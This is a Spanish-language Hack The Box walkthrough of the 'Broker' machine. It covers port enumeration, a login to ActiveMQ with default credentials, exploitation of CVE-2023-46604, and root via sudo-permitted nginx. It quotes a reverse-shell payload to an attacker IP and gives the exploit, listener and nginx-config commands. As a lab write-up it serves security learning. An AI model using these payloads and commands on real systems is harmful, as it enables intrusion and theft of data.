---
title: Broker
parent: Easy
nav_order: 1
---

# Walkthrough — Broker (Hack The Box)
{: .fs-9 }

> Walkthrough para la máquina *Broker* de HTB, enfocada en enumeración de puertos y explotación básica.
{: .fs-6 .fw-300 }

---

## Introducción

**Broker** es una máquina de nivel *Easy* en Hack The Box. El enfoque principal está en identificar puertos expuestos mediante escaneo completo y explotar los servicios visibles.

- SO: Linux  
- Dificultad: Easy  
- Herramientas utilizadas: `nmap`

---

## 🔎 Enumeración inicial

Lo primero que hice fue lanzar un escaneo completo de puertos usando `nmap`, incluyendo scripts por defecto y detección de versiones, para ver qué exponía la máquina. El comando fue el siguiente:

```bash
nmap -sC -sV -p- -T4 10.10.11.243
```

> `-sC`: Usa los scripts por defecto de NSE para una enumeración básica.  
> `-sV`: Detecta versiones de los servicios.  
> `-p-`: Escanea los 65535 puertos, no solo los comunes.  
> `-T4`: Acelera un poco el escaneo sin perder mucha estabilidad.

![Resultado de Nmap](/assets/images/broker/01-nmap.png)

## 🧠 Análisis de servicios detectados

Este escaneo me da una visión completa del panorama de servicios que corren en la máquina:

- **22/tcp (SSH)**: Servicio típico de administración remota.  
  👉 Por ahora no me sirve mucho, pero lo apunto para post-explotación. Si consigo credenciales, podría ser una vía rápida de entrada o escalada.  
- **80/tcp (HTTP)**: Servidor web Nginx funcionando... ¡pero nos recibe con un **401 Unauthorized**!  
  El detalle curioso es el *realm* `"ActiveMQRealm"`, que me da una pista muy jugosa: probablemente hay una instancia de **Apache ActiveMQ** detrás.

📌 *Esto nos puede llevar a un vector de ataque más adelante. Tomo nota...*

```bash
nmap -sC -sV -p- -T4 10.10.11.243
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 SHA256:a45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|   256 SHA256:cc:75:de:4a:e6:i3:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: 401 Unauthorized
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_basic realm=ActiveMQRealm
```

![Resultado de Nmap](/assets/images/broker/02-nmap.png)

## 🔐 Acceso al panel web de ActiveMQ

Al acceder vía HTTP a la IP `10.10.11.243`, el navegador me sorprendió con una ventana de autenticación básica:

![Prompt de autenticación](/assets/images/broker/03-auth-popup.png)

Esto confirma lo que ya sospechábamos desde el escaneo de puertos: ¡hay un servicio de **Apache ActiveMQ** corriendo detrás!

---

### 🤔 ¿Qué hice?

Probé con las credenciales por defecto más clásicas del universo de las malas prácticas:

```text
Username: admin  
Password: admin
```

🎯 **¡Y funcionó!**

---

Una vez dentro, fui redirigido a la interfaz de administración de ActiveMQ:

![Panel de ActiveMQ](/assets/images/broker/04-activemq-panel.png)

Desde aquí se pueden ver opciones para:
- Administrar el broker
- Visualizar demos web (¡a veces útiles para encontrar rutas inseguras!)
- Navegar documentación del framework

---

### 🧠 Conclusión

💡 El hecho de que ActiveMQ esté corriendo con las credenciales por defecto nos da acceso total al panel de administración. Esto puede abrir la puerta a:
- **Carga de archivos maliciosos**
- **Ejecución de comandos**
- **Explotación de versiones vulnerables**

¡Hora de ver qué versión corre y buscar un exploit!

## 🕵️‍♂️ Descubrimiento de rutas y panel oculto

Una vez dentro, me interesaba saber si había rutas o directorios interesantes detrás del servidor web. Para eso, utilicé `ffuf` con la wordlist `common.txt` de Seclists y el encabezado de autenticación básica en base64.

```bash
ffuf -u http://10.10.11.243/FUZZ \
-w /path/to/SecLists/Discovery/Web-Content/common.txt \
-H "Authorization: Basic YWRtaW46YWRtaW4=" \
-mc 200,204,301,302,307,403 \
-fs 401 -t 40
```

📌 La opción `-fs 401` filtra las respuestas con código 401 (Unauthorized) que ya sabemos que aparecen si no está autenticado correctamente.

![Fuzzing con ffuf](/assets/images/broker/05-ffuf.png)

---

### 🧃 Resultado interesante

Se descubrió la ruta `/admin/`, la cual abrí en el navegador, ¡y bingo! Me llevó al panel de administración real de ActiveMQ:

![Panel admin ActiveMQ](/assets/images/broker/06-activemq-admin.png)

---

## 🧬 Identificación de versión

Desde la interfaz se muestra claramente la versión:

```
Apache ActiveMQ 5.15.15
```

🎯 Esta información es clave para buscar exploits públicos o vulnerabilidades conocidas.

---

### 🧠 Próximo paso:

Voy a buscar posibles exploits para esa versión. Algunos caminos que valen la pena:

- Revisar CVEs relacionados con ActiveMQ 5.15.15.
- Ver si permite subida de archivos, ejecución de comandos o lectura de rutas internas.
- Probar exploits disponibles en `searchsploit` o `exploit-db`.

## 💥 Explotación – CVE-2023-46604 (Apache ActiveMQ RCE)

Después de identificar que el servidor corría **Apache ActiveMQ 5.15.15**, busqué vulnerabilidades asociadas y encontré una muy reciente:

> 📌 [CVE-2023-46604 en GitHub](https://github.com/evkl1d/CVE-2023-46604)

Esta vulnerabilidad permite **ejecución remota de comandos** (RCE) mediante deserialización insegura en el protocolo OpenWire.

![Repositorio del exploit](/assets/images/broker/07-exploit-repo.png)

---

### 🔧 Preparación del entorno

El repositorio incluye dos archivos clave:

- `exploit.py`: script en Python que envía la carga maliciosa.
- `poc.xml`: XML especialmente diseñado con payload para ejecutar comandos.

Este es un fragmento del archivo `poc.xml`:

```xml
<constructor-arg>
  <list>
    <value>bash</value>
    <value>-c</value>
    <value>bash -i &gt;&amp; /dev/tcp/10.10.14.7/9001 0&gt;&amp;1</value>
  </list>
</constructor-arg>
```

Este payload busca una **reverse shell** a nuestro equipo atacante (`10.10.14.7`, puerto `9001`).

![Contenido del XML](/assets/images/broker/08-xml-payload.png)

---

### 🔊 Preparando escucha y servidor

1. Primero levanté una escucha con `netcat` en el puerto 9001:

```bash
nc -lvp 9001
```

![Netcat escuchando](/assets/images/broker/09-nc-listen.png)

2. Luego, serví el archivo `poc.xml` por HTTP desde el mismo directorio del exploit:

```bash
sudo python3 -m http.server 80
```

Esto permite que el `exploit.py` descargue el payload desde mi máquina atacante.

![Servidor HTTP con python](/assets/images/broker/10-http-server.png)

---

### 🚀 Listo para explotar

Con todo listo, ejecuté el script `exploit.py` y… si todo va bien, debería obtener shell inversa 😈


## 🐚 Reverse Shell y flag de usuario

Con el listener listo y el servidor HTTP sirviendo el payload, ejecuté el exploit:

```bash
python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.7/poc.xml
```

![Ejecución del exploit](/assets/images/broker/11-exploit-run.png)

---

### ✅ ¡Conexión recibida!

Al instante, mi listener en el puerto `9001` recibió conexión desde la máquina víctima. Tenía shell interactiva como el usuario `activemq`:

```bash
nc -lvp 9001
```

```bash
Connection received on broker.htb 51634
activemq@broker:/opt/apache-activemq-5.15.15/bin$
```

![Shell recibida](/assets/images/broker/12-shell-received.png)

---

## 🏁 Flag de usuario

Buscando en el home del usuario, encontré la flag:

```bash
cat user.txt
```

![Flag de usuario](/assets/images/broker/13-user-flag.png)

✅ ¡Primera flag conseguida!  
Ahora tocaría explorar el sistema, buscar vectores para escalar privilegios y ver si podemos llegar a `root`.

## ⬆️ Escalada de privilegios con Nginx (Sudo abuse)

Al revisar los permisos sudo con:

```bash
sudo -l
```

Me encontré con una **joya**:

```text
(ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

✅ ¡Puedo ejecutar Nginx como root sin contraseña!

![Sudo sin contraseña](/assets/images/broker/14-sudo-nginx.png)

---

### 🧠 Idea: Servir `/root/` vía HTTP

Ya que Nginx puede ser lanzado como root, configuré un archivo `.conf` personalizado para exponer la raíz del sistema a través de un puerto cualquiera.

Escribí el siguiente archivo:

```nginx
user root;
events { worker_connections 1024; }
http {
  server {
    listen 1337;
    root /;
    autoindex on;
  }
}
```

```bash
cat <<EOF > /dev/shm/read_root.conf
(user root; ...)
EOF
```

![Creando archivo de configuración](/assets/images/broker/15-write-nginx-conf.png)

---

### 🚀 Lanzando Nginx como root

```bash
sudo /usr/sbin/nginx -c /dev/shm/read_root.conf
```

Esto inició Nginx con nuestra configuración y nos permitió acceder a `/root/` desde `localhost:1337`.

![Ejecutando Nginx](/assets/images/broker/16-launch-nginx.png)

---

## 🏁 Flag de root

Usando `curl`, simplemente accedí a la flag de root:

```bash
curl http://localhost:1337/root/root.txt
```

![Obteniendo flag de root](/assets/images/broker/17-root-flag.png)

🎉 **¡Máquina completada con éxito!**

---

## ✅ Resumen final

| Acción | Resultado |
|--------|-----------|
| Enumeración | Identificación de ActiveMQ y panel |
| Explotación | CVE-2023-46604 RCE |
| Acceso | Usuario `activemq` |
| Escalada | Sudo abuse con Nginx |
| Flags | `user.txt`, `root.txt` ✔️ |

---

**Autor:** [gueco99](https://github.com/gueco99)  
🧠 Hack the Box – *Broker* (Easy)


